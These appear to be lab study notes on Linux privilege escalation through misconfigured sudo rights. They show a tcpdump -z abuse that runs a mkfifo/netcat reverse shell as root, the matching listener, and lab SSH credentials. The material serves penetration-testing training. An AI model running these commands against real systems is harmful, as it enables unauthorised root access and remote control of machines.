# Sudo Rights Abuse

When the sudo command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers.

## Check to see if the current user has any sudo privileges

sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump

Example :

0. Misconfiguration : sudoers file is edited to grant a user the right to run a command such as tcpdump per the following entry in the sudoers file: (ALL) NOPASSWD: /usr/sbin/tcpdump

1. Create a reverse shell

cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

2. By specifying the -z flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands

sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

3. Listen Reverse Shell

nc -lnvp 443

## LAB

ssh htb-student@10.129.181.58
Academy_LLPE!

sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl



